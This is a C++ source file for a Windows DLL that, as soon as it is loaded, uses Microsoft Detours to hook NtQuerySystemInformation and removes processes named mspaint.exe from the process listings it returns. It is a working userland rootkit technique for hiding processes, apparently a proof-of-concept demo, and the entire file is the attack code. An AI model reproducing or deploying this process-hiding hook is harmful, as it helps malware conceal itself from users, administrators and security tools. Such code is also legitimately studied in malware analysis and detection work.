// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <winternl.h> // The native Windows api
#include "detours.h"

#pragma comment(lib, "detours.lib")

// NtQuerySystemInformation function pointer 
typedef NTSTATUS(__kernel_entry* QSI)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
    );
QSI qsi;

// Detour function 
__kernel_entry NTSTATUS NtQuerySystemInformationDetour(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, // What info to be retrieved. 
    PVOID                    SystemInformation,     // A buffer that receives the requested information.
    ULONG                    SystemInformationLength, // The size of the buffer pointed to by the SystemInformation parameter, in bytes.
    PULONG                   ReturnLength // Optional.
)
{
    // Calling og function (Trampoline)
    NTSTATUS status = qsi(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && status == (NTSTATUS)0x00000000)
    {
        SYSTEM_PROCESS_INFORMATION* pCurrent;
        SYSTEM_PROCESS_INFORMATION* pNext = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            if (wcsncmp(pNext->ImageName.Buffer, L"mspaint.exe", pNext->ImageName.Length) == 0)
            {
                if (pNext->NextEntryOffset == 0)
                    pCurrent->NextEntryOffset = 0;
                else
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
            }

        } while (pCurrent->NextEntryOffset != 0);

    }

    return status;
}


int hideProcess()
{
    HMODULE hK32 = GetModuleHandleW(L"Ntdll.dll");
    if (hK32 == NULL)
    {
        MessageBoxW(NULL, L"Failed to get a module handle", L"GetModuleHandle error", MB_ICONERROR);
        return 1;
    }
    FARPROC addr = GetProcAddress(hK32, "NtQuerySystemInformation");
    if (addr == NULL)
    {
        MessageBoxW(NULL, L"Failed to get the function address", L"GetProcAddress error", MB_ICONERROR);
        return 1;
    }

    qsi = (QSI)addr;

    if (DetourTransactionBegin() != NO_ERROR)
    {
        MessageBoxW(NULL, L"Failed to start transaction", L"MS Detours error", MB_ICONERROR);
        return 1;
    }
    if (DetourAttach(&(PVOID&)qsi, (PVOID)NtQuerySystemInformationDetour) != NO_ERROR)
    {
        MessageBoxW(NULL, L"Failed to attach detour", L"MS Detours error", MB_ICONERROR);
        return 1;
    }
    if (DetourTransactionCommit() != NO_ERROR)
    {
        MessageBoxW(NULL, L"Failed commit transaction", L"MS Detours error", MB_ICONERROR);
        return 1;
    }

    MessageBoxW(NULL, L"NtQuerySystemInformation Hooked", L"Success!", MB_ICONINFORMATION);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hideProcess();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



